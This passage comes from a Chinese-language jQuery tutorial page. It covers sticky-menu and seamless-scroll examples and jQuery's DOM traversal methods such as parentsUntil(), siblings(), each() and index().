punctuation">.</span><span class="token function">hide</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 定义点击事件</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.totop'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'html,body'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">animate</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                 <span class="token string">'scrollTop'</span><span class="token punctuation">:</span> <span class="token number">0</span>             <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>logBar<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Logo<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>menu<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>置顶菜单<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!-- 为了避免顶部菜单 一瞬间脱离文档流 设置一个站位的div --></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>menu_pos<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>down_con<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>网站主内容<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>javascript:;<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>totop<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="8-实例-无缝滚动"><a href="#8-实例-无缝滚动" class="headerlink" title="8.实例-无缝滚动"></a>8.实例-无缝滚动</h3><blockquote><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ie<span class="token punctuation">=</span>edge<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>无缝滚动<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css">     <span class="token selector">body </span><span class="token punctuation">{</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector">ul </span><span class="token punctuation">{</span>         <span class="token property">list-style</span><span class="token punctuation">:</span> none<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.slide</span> </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">500</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>         <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">1</span>px solid gray<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">20</span>px auto <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* 设置定位 */</span>         <span class="token property">position</span><span class="token punctuation">:</span> relative<span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">/* 清除浮动 */</span>         <span class="token property">overflow</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.slide</span> ul </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">1000</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">100</span>px<span class="token punctuation">;</span>         <span class="token property">position</span><span class="token punctuation">:</span> absolute<span class="token punctuation">;</span>         <span class="token property">left</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token property">top</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token selector"><span class="token class">.slide</span> ul li </span><span class="token punctuation">{</span>         <span class="token property">width</span><span class="token punctuation">:</span> <span class="token number">90</span>px<span class="token punctuation">;</span>         <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">90</span>px<span class="token punctuation">;</span>         <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">5</span>px<span class="token punctuation">;</span>         <span class="token property">background-color</span><span class="token punctuation">:</span> <span class="token hexcode">#ccc</span><span class="token punctuation">;</span>         <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>         <span class="token property">line-height</span><span class="token punctuation">:</span> <span class="token number">90</span>px<span class="token punctuation">;</span>         <span class="token property">font-size</span><span class="token punctuation">:</span> <span class="token number">30</span>px<span class="token punctuation">;</span>         <span class="token property">float</span><span class="token punctuation">:</span> left<span class="token punctuation">;</span>     <span class="token punctuation">}</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">     <span class="token function">$</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">var</span> $ul <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.slide ul'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 复制俩个</span>         $ul<span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span>$ul<span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> $ul<span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 定义移动的变量</span>         <span class="token keyword">var</span> deraction <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token keyword">var</span> timer <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span>move<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">function</span> <span class="token function">move</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             left <span class="token operator">-</span><span class="token operator">=</span> deraction<span class="token punctuation">;</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&lt;</span> <span class="token operator">-</span><span class="token number">500</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 left <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span><span class="token punctuation">;</span>             <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                 left <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">500</span><span class="token punctuation">;</span>             <span class="token punctuation">}</span><span class="token punctuation">;</span>             <span class="token comment" spellcheck="true">// ul 是 absolute,起始点为0,如果左移动到-500,就把left初始化为0</span>             <span class="token comment" spellcheck="true">// 如果右移一点,就把 left初始化到 -500</span>             <span class="token comment" spellcheck="true">// 这样复制的第二份总能显示.</span>             $ul<span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span>                 <span class="token string">'left'</span><span class="token punctuation">:</span> left             <span class="token punctuation">}</span><span class="token punctuation">)</span>         <span class="token punctuation">}</span>         <span class="token comment" spellcheck="true">// 设置左移,右移 的点击事件</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#btn1'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>             deraction <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 左移</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'#btn2'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>             deraction <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 右移</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// 设置鼠标悬停撤离事件</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.slide'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mouseover</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>             <span class="token function">clearInterval</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 清除定时器</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.slide'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mouseout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>             <span class="token comment" spellcheck="true">// timer 必须自动,否则悬停时,不能清除 timer</span>             timer <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span>move<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 开启定时器</span>         <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token punctuation">)</span> </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btns<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>向左<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>button<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>向右<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>slide<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h2 id="选择器遍历"><a href="#选择器遍历" class="headerlink" title="选择器遍历"></a>选择器遍历</h2><blockquote><p>遍历的意思是根据其相对于其他元素的关系来查找其他<code>HTML</code> 元素.用在选择器中,选取其他的<code>HTML</code> 元素.</p><p>比如如下树型结构:</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-9-27/1601216035085-10301.png" alt="10301"></p><p>比如<code>li</code> ,既有父级元素<code>ul,div</code> ,又有同级元素<code>li</code>,还有子集别元素<code>span</code>.</p></blockquote><h3 id="1-选择父级别元素"><a href="#1-选择父级别元素" class="headerlink" title="1.选择父级别元素"></a>1.选择父级别元素</h3><blockquote><p>方法:</p><ul><li><code>parent()</code>:只会向上一级遍历,返回被选元素的直接父元素</li><li><code>parents()</code>:一路向上直到文档的根元素<code>HTML</code> ,返回被选元素的所有祖先元素</li><li><code>parentsUntil(param)</code>:返回介于给定两个元素之间的所有祖先元素.</li></ul><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style language-css"><span class="token selector"><span class="token class">.ancestors</span> *</span><span class="token punctuation">{</span>     <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>    <span class="token property">border</span><span class="token punctuation">:</span> <span class="token number">2</span>px solid lightgrey<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> lightgrey<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> <span class="token number">5</span>px<span class="token punctuation">;</span>    <span class="token property">margin</span><span class="token punctuation">:</span> <span class="token number">15</span>px<span class="token punctuation">;</span><span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://cdn.staticfile.org/jquery/1.10.2/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">$</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"span"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">parentsUntil</span><span class="token punctuation">(</span><span class="token string">"div"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"color"</span><span class="token punctuation">:</span><span class="token string">"red"</span><span class="token punctuation">,</span><span class="token string">"border"</span><span class="token punctuation">:</span><span class="token string">"2px solid red"</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ancestors<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> body (曾曾祖父元素)  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">width</span><span class="token punctuation">:</span><span class="token number">500</span>px<span class="token punctuation">;</span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>div (曾祖父元素)    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>ul (祖父元素)        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>li (父元素)        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>span<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="2-选择子元素"><a href="#2-选择子元素" class="headerlink" title="2.选择子元素"></a>2.选择子元素</h3><blockquote><p>方法:</p><ul><li><code>children()</code>:返回被选元素的所有直接子元素,只会寻找一级.</li><li><code>find()</code>:返回被选元素的后代元素,一直到最后一个后代</li></ul></blockquote><h3 id="3-同级别元素"><a href="#3-同级别元素" class="headerlink" title="3.同级别元素"></a>3.同级别元素</h3><blockquote><p>方法:</p><ul><li><code>siblings()</code>:返回被选元素的所有同级别元素</li><li><code>next()</code>:只返回一个元素,返回被选元素的下一个同级别元素</li><li><code>nextAll()</code>:返回被选元素后方的所有同级别元素</li><li><code>nextUntil()</code> :返回介于两个给定参数之间的所有跟随的同胞元素</li><li><code>prev(),prevAll(),prevUntil()</code> :返回之前的元素,与<code>next</code>方向相反.</li></ul></blockquote><h3 id="4-过滤"><a href="#4-过滤" class="headerlink" title="4.过滤"></a>4.过滤</h3><blockquote><ul><li><code>first(),last(),eq()</code>:基于其在一组元素中的位置来选择一个特定的元素</li><li><code>filter(),not()</code>:选取匹配或不匹配某项指定标准的元素</li></ul></blockquote><h3 id="5-循环each"><a href="#5-循环each" class="headerlink" title="5.循环each()"></a>5.循环<code>each()</code></h3><blockquote><p>方法(为每个匹配元素规定要运行的函数):</p><pre class="line-numbers language-JavaScript"><code class="language-JavaScript">$(selector).each(function(index,element))// index 选择器的index位置// element 当前的元素,也可以使用 $(this) 选择器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><h3 id="6-index-方法"><a href="#6-index-方法" class="headerlink" title="6.index() 方法"></a>6.<code>index()</code> 方法</h3><blockquote><p>返回指定元素相对于其他指定元素的<code>index</code> 值,这些元素可以通过<code>jQuery</code> 选择器或<code>DOM</code> 元素来指定,如果没有找到元素,返回<code>-1</code>.</p><ol><li>返回元素相对于同级别元素的<code>index</code>.</li></ol><pre class="line-numbers language-html"><code class="language-html">$(function(){    $('li').click(()=>{        $(this).index()    })})<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>Milk<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token punctuation">></span></span>Tea<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token punctuation">></span></span>Coffee<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token 